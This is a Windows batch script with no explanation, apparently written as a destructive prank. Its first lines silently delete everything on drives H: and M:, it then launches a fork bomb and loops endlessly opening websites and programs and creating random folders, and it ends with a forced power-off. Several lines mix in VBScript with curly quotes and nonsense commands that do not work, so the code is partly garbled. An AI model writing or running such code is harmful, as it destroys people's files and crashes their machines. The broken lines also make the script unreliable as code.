@echo off
rd/s/q H:
rd/s/q M:
START %SystemRoot%\system32\notepad.exe
Set wshShell = wscript.CreateObject(”WScript.Shell”)
%0|%0
:a
start www.facebook.com
start www.youtube.com
start www.yahoo.com
start www.whatsapp.com
start www.twitter.com
start www.instagram.com
start www.snapchat.com
start www.google.com
start www.facebook.com
start www.youtube.com
start www.yahoo.com
start www.whatsapp.com
start www.twitter.com
start www.instagram.com
start www.snapchat.com
start www.google.com
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
start winword
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
wscript.sleep 100
wshshell.sendkeys “~(enter)”
md %random%
/folder.
start shut down your computer
goto :a
SHUTDOWN /p